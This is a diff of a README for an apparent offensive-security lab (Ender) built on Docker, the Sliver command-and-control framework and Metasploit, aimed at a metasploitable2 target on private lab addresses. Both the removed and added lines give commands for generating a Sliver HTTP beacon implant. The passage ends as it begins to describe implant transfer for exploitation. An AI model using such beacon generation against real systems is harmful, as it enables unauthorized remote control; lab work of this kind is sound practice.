@@ -6,27 +6,10 @@ Go to Ender directory
 docker compose up -d --build
 ```
 
-#### Setting Sliver Persistence (FIRST TIME BUILDING)
-In one terminal (Sliver Server):
-```bash
-docker exec -it operator /bin/bash
-cd /opt/sliver 
-sliver-server
-> new-operator --name operator1 --lhost 10.1.1.2
-> multiplayer
-```
-Creates /opt/sliver/operator1_10.1.1.2.cfg
+#### A note on Sliver persistence
+Any Sliver .cfg file you make or Sliver beacon you create will persist throughout sessions.
 
-
-In second terminal (Sliver Client):
-```bash
-docker exec -it operator /bin/bash
-cd /opt/sliver
-sliver-client import operator1_10.1.1.2.cfg
-```
-Saves to /root/.sliver-client/configs/operator1_10.1.1.2.cfg
-
-### From Now On, if you build down and up or start and stop containers, sliver configuration persists (test by running docker compose down and rebuilding before continuing)
+So if you compose up/down or start/stop, your previous .cfg files and beacons will persist.
 
 #### Testing Ender server and metasploit
 
@@ -90,22 +73,21 @@ ping -c 4 10.1.1.3
 nmap -l metasploitable2
 ```
 
-#### Firstly, setting up beacon
+#### Firstly, creating a sliver beacon
 In one terminal (Sliver Server):
 ```bash
-docker exec -it operator /bin/bash 
-root@operator:/workspace/enderCLI# sliver-server
-> multiplayer
+docker exec -it operator /bin/bash
+root@operator:/workspace/enderCLI# python ender_server/server.py
 ```
-***MUST INCLUDE MULTIPLAYER***
 
 In second terminal (Sliver Client):
 ```bash
 docker exec -it operator /bin/bash
-root@operator:/workspace/enderCLI# sliver-client
-> generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
-> http	
+root@operator:/workspace/enderCLI# python ender_client/client.py
+Enter message (or 'quit' to exit): create_beacon operator1 10.1.1.2 5 0 10.1.1.2 linux amd64 testbeacon
 ```
+
+Go back to the first terminal to monitor the Sliver beacon creation and verify that beacon is created
 
 #### Secondly, set up server to transfer implant for exploitation
 In third terminal (operator workspace):
